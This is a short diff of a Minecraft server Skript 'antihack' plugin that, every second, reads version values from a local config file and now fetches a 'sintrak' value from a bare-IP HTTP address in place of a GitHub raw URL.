@@ -25,6 +25,6 @@ every second:
     set {version-main} to line 3 in file "plugins/antihack/config.yml"
     set {version-update} to line 4 in file "plugins/antihack/config.yml" 
     set {version-command} to line 5 in file "plugins/antihack/config.yml" 
-    set {sintrak-1} to line 2 from url "https://raw.githubusercontent.com/HelloWorldCH/AntiHackMinecraft/main/sintrak.yml"
-    set {sintrak-2} to line 3 from url "https://raw.githubusercontent.com/HelloWorldCH/AntiHackMinecraft/main/sintrak.yml"
+    set {version-sintrack} to line 6 in file "plugins/antihack/config.yml" 
+    set {sintrak-1} to line 1 from url "http://154.16.7.221/antihack/antihack/index.php"
     set {credit} to line 5 from url "https://raw.githubusercontent.com/HelloWorldCH/AntiHackMinecraft/main/sintrak.yml"
